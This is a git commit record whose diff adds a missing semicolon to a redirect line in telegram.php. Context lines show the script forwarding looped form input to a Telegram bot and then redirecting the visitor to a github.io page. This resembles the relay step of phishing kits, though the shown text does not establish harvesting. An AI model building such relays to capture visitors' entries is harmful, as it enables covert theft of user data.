497b5208d5fd0062a9fdbfc14f95e2d630618051
TerraArrs <166519103+TerraArrs@users.noreply.github.com>
2024-08-05 22:03:00 +0600

    Update telegram.php

--- telegram.php
+++ telegram.php
@@ -19,6 +19,6 @@ foreach($arr as $key => $value) {
 
 $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
-header("Location:https://terraarrs.github.io/TESTERS/ss.html")
+header("Location:https://terraarrs.github.io/TESTERS/ss.html");
 
 ?>
